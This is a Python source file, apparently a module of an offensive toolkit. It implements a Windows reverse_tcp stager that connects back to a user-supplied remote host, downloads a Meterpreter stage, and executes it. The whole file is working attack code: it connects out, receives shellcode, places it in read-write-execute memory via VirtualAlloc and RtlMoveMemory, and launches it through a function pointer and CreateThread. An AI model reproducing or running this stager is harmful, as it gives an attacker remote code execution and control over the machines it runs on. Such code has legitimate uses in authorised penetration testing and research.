import utils.arg
from utils.helper import nstate as nstate
from time import sleep
import ctypes.wintypes
#import sys
#import argparse
import socket
import struct
import ctypes

class stager():
    
    Author = 'raptor@0xdeadbeef.info, psycore8'
    Description = 'Connect back (reverse_tcp) to remote host and receive a stage'
    Version = '0.0.3'
    payload = any
    sock = any

    def __init__(self, remote_host=str, remote_port=int, timeout=int, architecture=str, sleeptime=int):
        self.remote_host = remote_host
        self.remote_port = remote_port
        self.timeout = timeout
        self.architecture = architecture
        self.sleeptime = sleeptime

    def init():
        spName = 'msfstager'
        # flag, name, choices=, action=, default=, type, required, help)
        spArgList = [
            ['-a', '--arch', ['x64', 'x86'], None, 'x64', str, False, 'Architecture to use, x64 is the default'],
            ['-p', '--port', None, None, 4444, int, True, 'Remote port to connect to'],
            ['-r', '--remote-host', None, None, None, str, True, 'Remote host to connect to'],
            ['-s', '--sleep', None, None, 0, int, True, 'Sleep for x seconds before the stage is executed'],
            ['-t', '--timeout', None, None, 30, int, False, 'Connect timeout in seconds, 30 seconds is the default']
        ]
        utils.arg.CreateSubParserEx(spName, stager.Description, spArgList)

    def CreateSocket(self):
        print(f'{nstate.OKBLUE} Creating Socket...')
        socket.setdefaulttimeout(self.timeout)
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        #self.sock.connect((self.remote_host, self.remote_port))
        con = self.sock.connect_ex((self.remote_host, self.remote_port))
        if con == 0:
            print(f'{nstate.OKGREEN} Connection established')
        else:
            print(f'{nstate.FAIL} Connevtion failed')

    def ReceivePayload(self):
        # get 4-byte payload length
        l = struct.unpack("@I", self.sock.recv(4))[0]

        # download payload
        print(f'{nstate.OKBLUE} Download stage...')
        d = self.sock.recv(l)
        while len(d) < l:
            d += self.sock.recv(l - len(d))
        print(f'{nstate.OKBLUE} Payload size: {len(d)} bytes')

        if self.architecture == 'x64':
            self.payload = bytearray(
                b"\x48\xbf"
                + self.sock.fileno().to_bytes(8, byteorder="little")
                + d)
        elif self.architecture == 'x86':
            self.payload = bytearray(
                    b"\xbf"
                    + self.sock.fileno().to_bytes(4, byteorder="little")
                    + d)
        if self.payload:
            print(f'{nstate.OKGREEN} Stage downloaded!')
        else:
            print(f'{nstate.FAIL} Error during download')
            
    def LaunchStage(self):
        print(f'{nstate.OKBLUE} Trying to execute Meterpreter stage...')
        MEM_COMMIT_RESERVE = 0x00003000
        PAGE_READWRITE_EXECUTE = 0x00000040

        kernel32 = ctypes.windll.kernel32

        VirtualAlloc = kernel32.VirtualAlloc
        VirtualAlloc.argtypes = [ctypes.wintypes.LPVOID, ctypes.c_size_t, ctypes.wintypes.DWORD, ctypes.wintypes.DWORD]
        VirtualAlloc.restype = ctypes.wintypes.LPVOID

        RtlMoveMemory = kernel32.RtlMoveMemory
        RtlMoveMemory.argtypes = [ctypes.c_void_p, ctypes.c_void_p, ctypes.c_size_t]
        RtlMoveMemory.restype = None

        CreateThread = kernel32.CreateThread
        CreateThread.argtypes = [ctypes.c_int, ctypes.c_size_t, ctypes.c_int, ctypes.c_int, ctypes.wintypes.DWORD, ctypes.c_int]
        CreateThread.restype = None

    #     WaitForSingleObject = kernel32.WaitForSingleObject
    #     WaitForSingleObject.argtypes = [ctypes.wintypes.HANDLE, ctypes.wintypes.DWORD]
    #     WaitForSingleObject.restype = None

        ptr = VirtualAlloc(0, len(self.payload), MEM_COMMIT_RESERVE, PAGE_READWRITE_EXECUTE)

        print(f'Pointer: {ptr}')
        print(f'{len(self.payload)}')
        if ptr:
            print(f'{nstate.OKGREEN} Memory allocated!')
            buf = (ctypes.c_char * len(self.payload)).from_buffer(self.payload)
            RtlMoveMemory(ptr, buf, len(self.payload))

        if self.sleeptime > 0:
            print(f'{nstate.INFO} Let\'s take a nap for {self.sleeptime} seconds')
            sleep(self.sleeptime)

        # execute the shellcode
        ptr_f = ctypes.cast(ptr, ctypes.CFUNCTYPE(ctypes.c_void_p))
        ptr_f()
        
        print(f'{nstate.OKBLUE} Execute payload...')
        ht = CreateThread(0, 0, ptr, 0, 0, ctypes.pointer(0))
        if ht:
            print(f'{nstate.OKGREEN} Looks good!')
        else:
            print(f'{nstate.FAIL} Payload not executed')
        ctypes.windll.kernel32.WaitForSingleObject(
                ctypes.c_int(ht),
                ctypes.c_int(-1))
    #     WaitForSingleObject(ht, -1)    

    def process(self):
        self.CreateSocket()
        self.ReceivePayload()
        self.LaunchStage()

    